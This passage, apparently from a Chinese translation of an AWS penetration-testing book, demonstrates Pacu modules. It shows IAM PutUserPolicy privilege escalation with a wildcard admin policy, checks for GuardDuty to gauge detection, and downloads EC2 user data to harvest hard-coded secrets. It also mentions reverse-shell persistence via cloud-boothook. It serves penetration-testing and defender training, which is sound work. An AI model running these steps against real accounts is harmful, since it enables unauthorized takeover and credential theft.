该模块将执行，搜索您的权限，看看您是否容易受到它检查的任何升级方法的攻击，然后它将尝试利用它们。对于我们的`Test`用户，它应该会检测到我们容易受到`PutUserPolicy`特权升级方法的攻击。然后它将尝试滥用该权限，以在我们的用户上放置（实质上附加）一个新的内联策略。我们控制着我们附加到用户的策略，因此我们可以指定一个管理员级别的 IAM 策略并将其附加到我们的用户，然后我们将获得管理员访问权限。该模块将通过向我们的用户添加以下策略文档来自动执行此操作：

```
{ 
    "Version": "2012-10-17", 
    "Statement": [ 
        { 
            "Effect": "Allow", 
            "Action": "*", 
            "Resource": "*" 
        } 
    ] 
} 
```

以下截图显示的输出应该与您运行特权升级模块时看到的类似：

![](img/9f7c65a0-0008-42aa-bb2a-0d36becbb74d.png)

在前面的截图中，我们可以看到一行`成功添加了名为 jea70c72mk 的内联策略！您不应该具有管理员权限。`这听起来不错，但让我们确认一下以确保。

我们可以通过几种不同的方式来确认这一点；其中一种是再次运行`iam__enum_permissions`模块，然后查看权限字段。它应该包括一个新的权限，即星号（`*`），这是一个通配符，表示`所有权限`。这意味着我们对环境拥有管理员访问权限！

如果我们在 AWS Web 控制台中查看我们的用户，我们会看到我们的用户附加了一个名为`jea70c72mk`的新策略，当我们点击它旁边的箭头以展开文档时，我们可以看到其中放置了管理员策略：

![](img/a70a6049-18db-4ef1-ad7a-1028fe8966d2.png)

# 使用我们的新管理员特权

Pacu 允许我们直接从 Pacu CLI 使用 AWS CLI，用于您可能只想运行单个命令而不是完整模块的情况。让我们利用这个功能和我们的新管理员权限来运行一个 AWS CLI 命令，以请求我们以前没有的数据。这可以通过像平常一样运行 AWS CLI 命令来完成，这样我们就可以尝试运行一个命令来枚举账户中的其他资源。我们目前在我们自己的个人账户中，所以这个命令可能对您来说不会返回任何有效数据，但是在攻击其他账户时检查这个 API 调用将是很重要的。

我们可以通过从 Pacu CLI 运行以下命令来检查账户是否在`us-east-1`地区启用了`GuardDuty`：

```
   aws guardduty list-detectors --profile Test --region us-west-2 
```

在我们的`Test`账户中，我们确实运行了`GuardDuty`，所以我们得到了下面截图中显示的输出。但是，如果您没有运行`GuardDuty`，那么`DetectorIds`字段将为空：

![](img/a679d048-b454-47a5-b46a-d7f24af21fc0.png)

该命令从 AWS 返回了一个`DetectorId`。对于这个 API 调用，任何数据的存在都意味着`GuardDuty`先前已经在该地区启用，因此可以安全地假定它仍然在没有进行更多 API 调用的情况下启用。如果在目标地区禁用了`GuardDuty`，`DetectorIds`将只是一个空列表。作为攻击者，最好是`GuardDuty`被禁用，因为这样我们就知道它不会警报我们正在执行的任何恶意活动。

然而，即使启用了`GuardDuty`，这并不意味着我们的努力是徒劳的。在这样的攻击场景中，有许多因素会起作用，比如是否有人在关注被触发的`GuardDuty`警报，如果他们注意到了警报，对警报做出反应的响应时间，以及做出反应的人是否对 AWS 有深入的了解，能够完全追踪你的行动。

我们可以通过运行`detection__enum_services` Pacu 模块来检查`GuardDuty`和其他日志记录和监控服务。该模块将检查 CloudTrail 配置、CloudWatch 警报、活动的 Shield 分布式拒绝服务（DDoS）保护计划、`GuardDuty`配置、Config 配置和资源，以及虚拟私有云（VPC）流日志。这些服务都有不同的目的，但作为攻击者，了解谁在监视您和跟踪您非常重要。

Pacu 在枚举类别中有许多模块，可用于枚举目标 AWS 帐户中的各种资源。一些有趣的模块包括`aws__enum_account`模块，用于枚举当前 AWS 帐户的信息；`aws__enum_spend`模块，用于收集正在花费资金的 AWS 服务列表（因此您可以确定使用哪些服务，而无需直接查询该服务的 API）；或`ec2__download_userdata`模块，用于下载和解码附加到帐户中每个 EC2 实例的 EC2 用户数据。

EC2 用户数据本质上只是一些文本，您可以将其添加到 EC2 实例中，一旦实例上线，该数据就会对其可用。这可以用于设置实例的初始配置，或者为其提供可能需要稍后查询的设置或值。还可以通过 EC2 用户数据执行代码。

通常，用户或软件会将硬编码的机密信息（例如 API 密钥、密码和环境变量）放入 EC2 用户数据中。这是不良做法，并且亚马逊在其文档中不鼓励这样做，但这仍然是一个问题。作为攻击者，这对我们有利。任何用户都可以通过`ec2:DescribeInstanceAttribute`权限读取 EC2 用户数据，因此任何硬编码的机密信息也会对他们可用。作为攻击者，检查这些数据是否有用非常重要。

`ec2__download_userdata` Pacu 模块将自动遍历并下载帐户中枚举的所有实例和启动模板的用户数据，使我们能够轻松地筛选结果。

您可以运行以下命令来启动该模块：

```
 run ec2__download_userdata 
```

现在 Pacu 将检查其已知的每个 EC2 实例是否有用户数据，如果有，它将下载到主 Pacu 目录中的`./sessions/[session name]/downloads/ec2_user_data/`文件夹中。

如果您尚未使用`ec2__enum`模块在目标帐户中枚举 EC2 实例和启动模板，则在执行模块之前将提示您运行它。您可能会收到一条消息，确认是否要针对每个 AWS 区域运行该模块，这样做现在是可以的，因此我们将回答`y`：

![](img/d93c92a6-e74e-4a18-8066-ef9ce9be44a7.png)

在枚举了 EC2 实例之后，它可能会询问您是否对 EC2 启动模板进行相同的操作，因为启动模板也包含用户数据。我们也可以允许它进行枚举。

在枚举了实例和启动模板之后，执行将切换回我们原始的`ec2__download_userdata`模块，以下载和解码我们找到的任何实例或启动模板相关联的用户数据。

该模块在我们的帐户中找到了三个 EC2 实例和一个 EC2 启动模板，这些实例和模板都与用户数据相关联。以下截图显示了模块的输出，包括其执行结果以及存储数据的位置：

![](img/ed322637-f4f9-4021-9eb3-819e9fe9e0d6.png)

`ec2__download_userdata`模块在帐户中找到了附加到四个 EC2 实例中的用户数据，并在帐户中找到了一个启动模板中的一个。然后将这些数据保存到 Pacu 目录的`./sessions/Demo/downloads/ec2_user_data/`文件夹中。

如果我们导航到这些文件下载到的文件夹并在文本编辑器中打开它们，我们可以看到明文数据。以下截图显示了`ap-northeast-2`地区中具有`i-0d4ac408c4454dd9b`ID 实例的用户数据如下：

![](img/dc42e7e7-0963-4aa3-bc64-ddcedaa894eb.png)

这只是一个示例，用来演示这个概念，所以基本上当 EC2 实例启动时，它将运行这个命令：

```
 echo "test" > /test.txt 
```

然后它将继续引导过程。大多数情况下，传递到 EC2 用户数据中的脚本只有在实例首次创建时才会执行，但是通过在前面的用户数据中使用`#cloud-boothook`指令，实例被指示在每次引导时运行此代码。这是一种很好的方法，可以通过在用户数据中放置一个反向 shell 来获得对 EC2 实例的持久访问权限，以便在每次实例重新启动时执行，但这将在后续章节中进一步讨论。

# 总结

在本章中，我们已经介绍了如何利用 Python 的`boto3`库来进行 AWS 渗透测试。它使我们能够快速简单地自动化我们攻击过程的部分，我们特别介绍了如何为自己和环境中的其他人枚举 IAM 权限的方法（以两种不同的方式），以及如何应用这些知识来提升我们的特权，希望成为账户的完整管理员。

我们还看到了 Pacu 已经为我们自动化了很多这个过程。尽管 Pacu 很好，但它不能涵盖你所想到的每一个想法、攻击方法或漏洞，因此学会如何在 Pacu 之外正确地与 AWS API 进行交互是很重要的。然后，凭借这些知识，你甚至可以开始为其他人编写自己的 Pacu 模块。

在下一章中，我们将继续使用`boto3`和 Pacu 来为我们的目标环境建立持久访问。这使我们能够在最坏的情况下幸存，并确保我们可以保持对环境的访问权限。这使我们能够帮助培训防御者进行事件响应，以便他们可以了解他们的环境中哪些区域是盲点，以及他们如何修复它们。在 AWS 中建立持久性的潜在方法有很多种，其中一些已经被 Pacu 自动化，我们将研究如何使用 IAM 和 Lambda 来部署这些方法。
